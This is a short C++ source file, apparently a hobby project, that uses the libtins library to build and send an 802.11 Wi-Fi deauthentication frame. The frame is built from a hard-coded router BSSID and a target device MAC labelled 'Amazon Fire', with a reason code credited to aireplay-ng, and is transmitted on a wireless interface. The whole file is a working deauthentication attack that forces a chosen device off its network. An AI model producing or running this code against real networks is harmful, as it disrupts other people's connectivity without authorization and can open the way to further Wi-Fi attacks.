#include "Network.h"

using namespace Tins;

Network::Network()
{
    bssid = HWAddress<6>("AE:28:06:AD:19:70"); //Router
    target = HWAddress<6>("40:b4:cd:6e:de:d5"); //Amazon Fire
    deauthPacket = Dot11Deauthentication(target, bssid); //Set target / sender
    deauthPacket.addr3(bssid); //Set the BSSID
    deauthPacket.reason_code(0x0007); //From airplay-ng
    radio = RadioTap() / deauthPacket;
}

Network::~Network()
{
}

void Network::sendDeauth() {
    sender.send(radio, "wlp2s0");
}
